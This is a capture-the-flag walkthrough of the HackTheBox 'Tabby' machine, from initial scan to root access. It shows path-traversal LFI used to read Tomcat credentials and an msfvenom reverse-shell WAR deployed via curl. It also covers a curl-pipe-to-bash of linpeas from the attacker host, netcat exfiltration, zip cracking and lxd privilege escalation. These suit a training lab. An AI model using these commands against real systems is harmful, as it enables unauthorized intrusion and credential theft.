## Nmap Scan

```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-26 08:14 CDT
Nmap scan report for megahosting.htb (10.10.10.194)
Host is up (0.034s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 0.58 seconds
```

## Enumeration

Running a quick port scan shows us that ports 80 and 8080 are both open, meaning we have a tomcat instance running on the machine, as well as a normal webserver. Visiting the website on port 80 and clicking "news" gives us a name for the website, that we'll need to add to our /etc/hosts file:

*megahosting.htb*

Manually walking through the website on port 80 gives us LFI at the following address:

*http://megahosting.htb/news.php?file=*

Since we know that tomcat is running, we'll visit the tomcat instance on port 8080. We see the following interesting lines:

*Tomcat veterans might be pleased to learn that this system instance of Tomcat is installed with CATALINA_HOME in /usr/share/tomcat9 and CATALINA_BASE in /var/lib/tomcat9, following the rules from /usr/share/doc/tomcat9-common/RUNNING.txt.gz.*

Further down the page, we get an incorrect location for the tomcat-users.xml file, which will hold the credentials we need to log into the machine. We know that the tomcat-users.xml file should be in CATALINE_BASE + /conf/tomcat-users.xml, but visiting this location with our LFI doesn't work. To automate the process, we can use ffuf and do a quick scan of directories in CATALINE_BASE (/usr/share/tomcat9) to see if we can get a quick win:

```
$ ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u 'http://megahosting.htb/news.php?file=../../../../../../usr/share/tomcat9/FUZZ/tomcat-users.xml' -fs 0

```

It looks like /usr/share/tomcat9/etc/tomcat-users.xml exists, so we'll visit this in our browser!

view-source:http://megahosting.htb/news.php?file=../../../../../../usr/share/tomcat9/etc/tomcat-users.xml

```
...
<user username="tomcat" password="$3cureP4s5w0rd123!" roles="admin-gui,manager-script"/>
...
```

Now we have a username and password combination for the tomcat manager instance!

Visiting http://megahosting.htb:8080/manager/html and using the credentials gives us a "Permission denied" error since we're not on the same machine, but visiting http://megahosting.htb:8080/host-manager/html lets us connect.

If we looks at the roles that our user has, he isn't in the manager-gui group so we can't use the manager HTML interface, but he is in the manager-script group so we can use the text interface. We'll first need to create a war shell to upload:

```
msfvenom -p java/jsp_shell_reverse_tcp lhost=10.10.xx.xx lport=1234 -f war -o meter.war
```

We also need to open a listener:

```
$ msfconsole
$ use exploit/multi/handler
$ set LHOST 10.10.xx.xx
$ set LPORT 1234
$ exploit -j
```

With our shell ready to go, we can use curl to communicate with the server, after grabbing our Authorization Header with Burp:

```
curl -T meter.war -H "Authorization: Basic dG9tY2F0OiQzY3VyZVA0czV3MHJkMTIzIQ==" http://10.10.10.194:8080/manager/text/deploy?path=/shell
```

Now that the shell has been deployed, we can visit it in our browser at:

http://megahosting.htb:8080/shell

```
msf5 exploit(multi/handler) > shell session 1 opened (10.10.14.28:1234 -> 10.10.10.194:54304) at 2020-06-26 10:59:21 -0500
msf5 exploit(multi/handler) > sessions 1
[*] Starting interaction with 1...

id
uid=997(tomcat) gid=997(tomcat) groups=997(tomcat)
```

Now, we'll import TTY to give ourselves a better shell, and do some enumeration:

```
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
tomcat@tabby:/var/lib/tomcat9/$
```

We can run linpeas.sh to get an overview of what we have on the system:

```
$ curl http://10.10.xx.xx/linpeas.sh | bash

[+] Backup files?                                                                                                    
-rw-r--r-- 1 ash ash 8716 Jun 16 13:42 /var/www/html/files/16162020_backup.zip  
-rw-r--r-- 1 root root 2743 Apr 23 07:35 /etc/apt/sources.list.curtin.old   
...
```

The backup file in the html/files directory is interesting, as it's owned by ash:

```
$ ls -lah /var/www/html/files/16162020_backup.zip 

-rw-r--r-- 1 ash ash 8.6K Jun 16 13:42 /var/www/html/files/16162020_backup.zip
```

We'll send this to our attacking machine with netcat, then crack it with john:

```
$ zip2john backup.zip > hash.txt

$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
...
backup.zip:admin@it::backup.zip:var/www/html/news.php, var/www/html/logo.png, var/www/html/index.php:backup.zip
```

We cracked the password for a file owned by ash, so we'll see if he reused his account password for this zip file:

```
$ su ash
su ash
Password: admin@it

ash@tabby:$
```

## Escalating to Root

If we look at our groups, we can see that we're part of the lxd group, which will be an easy priv-esc method:

```
$ id

uid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)
```

We'll start by building an alpine image on our attacking machine:

```
$ git clone https://github.com/saghul/lxd-alpine-builder.git

$ cd lxd-alpine-builder

$ sudo ./build-alpine -a i686

$ mv alpine-v3.12-i686-20200626_1209.tar.gz alpine.tar.gz
```

Now, we'll download this to the victim machine, and import it:

```
$ wget http://10.10.xx.xx/alpine.tar.gz

$ lxc image import ./alpine.tar.gz --alias myimage

$ lxd init

[Hit enter until this completes]
```

Now, we need to set up the image:

```
$ lxc init myimage mycontainer -c security.privileged=true

$ lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true

$ $ lxc list                      
+-------------+---------+------+------+-----------+-----------+                                                      
|    NAME     |  STATE  | IPV4 | IPV6 |   TYPE    | SNAPSHOTS |                                                                                                                                                                            
+-------------+---------+------+------+-----------+-----------+                                                      
| mycontainer | STOPPED |      |      | CONTAINER | 0         |                                                                                                                                                                            
+-------------+---------+------+------+-----------+-----------+   

```

Finally, we can start the container, and get a root shell:

```
$ lxc start mycontainer

$ lxc exec mycontainer /bin/sh

~ # ^[[30;5Rid                                                                                                   
uid=0(root) gid=0(root)  
```

Since we mounted our file system on the alpine images /mnt/root, we can grab the flag:

```
~ # ^[[60;5Rls -lah /mnt/root/root
ls -lah /mnt/root/root
total 40K    
drwx------    6 root     root        4.0K Jun 16 13:59 .

drwxr-xr-x    3 root     root        4.0K May 19 10:41 snap
```

There's our flag!
